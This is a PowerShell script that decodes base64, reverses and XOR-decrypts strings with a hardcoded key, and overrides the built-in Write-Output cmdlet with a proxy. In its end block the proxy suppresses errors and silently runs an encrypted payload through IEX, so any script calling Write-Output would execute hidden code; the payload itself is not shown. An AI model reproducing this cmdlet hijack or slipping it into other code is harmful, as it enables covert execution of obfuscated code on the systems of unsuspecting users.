function Reverse-ByteArray
{
	Param(
		[byte[]]$ByteArray
		)
		return $ByteArray[-1..-($ByteArray.length)]
}

function Convert-StringToByteArray
{
    Param(
        [String]$String
    )
    
    return [Text.Encoding]::Ascii.GetBytes($String)

}


function Convert-ByteArrayToString
{
    Param(
        [Byte[]]$ByteArray
    )
    return [Text.Encoding]::Ascii.GetString($ByteArray)

}

function Convert-StringToBase64
{
    Param(
        [string]$String
    )
    return [Convert]::ToBase64String([System.Text.Encoding]::Ascii.GetBytes($String))
}

function Convert-ByteArrayToBase64
{
    Param(
        [string]$ByteArray
    )
    return [Convert]::ToBase64String($ByteArray)
}

function Convert-Base64ToString
{
    Param(
        [string]$String
    )
    return Convert-ByteArrayToString ([Convert]::FromBase64String($String))
}

function Get-RandomBytes
{
    <# Thanks to Matt Graeber for this #>
    Param (
        [Parameter(Mandatory = $True)]
        [UInt32]
        $Length,
 
        [Parameter(Mandatory = $True)]
        [ValidateSet('GetRandom', 'CryptoRNG')]
        [String]
        $Method
    )

    $RandomBytes = New-Object Byte[]($Length)
 
    switch ($Method)
    {
        'GetRandom' {
            foreach ($i in 0..($Length - 1))
            {
                $RandomBytes[$i] = Get-Random -Minimum 0 -Maximum 256
            }
         }
         'CryptoRNG' {
             $RNG = [Security.Cryptography.RNGCryptoServiceProvider]::Create()
             $RNG.GetBytes($RandomBytes)
         }
    }
    $RandomBytes
}

function XOR-ByteArray
{
	Param(
		[byte[]]$ByteArray,
		[string]$Key
	)
	$BKey = Convert-StringToByteArray -String $Key
	
	for ($i = 0; $i -lt $ByteArray.count; $i++)
	{
		$ByteArray[$i] = $ByteArray[$i] -bxor $BKey[$i % $BKey.length]
	}
	return $ByteArray
}

function Decrypt-String
{
	Param(
		[string]$Base64String,
		[String]$Key
	)
	$BA = Convert-Base64ToString -String $Base64String
	$BA = Convert-StringToByteArray -String $BA
	$BA = Reverse-ByteArray -ByteArray $BA
	$BA = XOR-ByteArray -ByteArray $BA -Key $Key
	$Ret = Convert-ByteArrayToString -ByteArray $BA
	return $Ret
}

$XK = "aBCdEfG"

function Write-Output
{
	[CmdletBinding(HelpUri='http://go.microsoft.com/fwlink/?LinkID=113427', RemotingCapability='None')]
	param(
		[Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromRemainingArguments=$true)]
		[AllowNull()]
		[AllowEmptyCollection()]
		[psobject[]]
		${InputObject})

	begin
	{
		$TMP = $ErrorActionPreference
		$ErrorActionPreference = "SilentlyContinue"
		try {
			$outBuffer = $null
			if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
			{
				$PSBoundParameters['OutBuffer'] = 1
			}
			$wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Write-Output', [System.Management.Automation.CommandTypes]::Cmdlet)
			$scriptCmd = {& $wrappedCmd @PSBoundParameters }
			$steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
			$steppablePipeline.Begin($PSCmdlet)
		} catch {
			throw
		}
	}

	process
	{
		try {
			$steppablePipeline.Process($_)
		} catch {
			throw
		}
	}

	end
	{
		IEX(Decrypt-String -Base64String $dfgDFHdHDFhdfHFD -Key $XK) | out-null
		$ErrorActionPreference = $TMP
		try {
			$steppablePipeline.End()
		} catch {
			throw
		}
	}
	<#

	.ForwardHelpTargetName Write-Output
	.ForwardHelpCategory Cmdlet

	#>
}
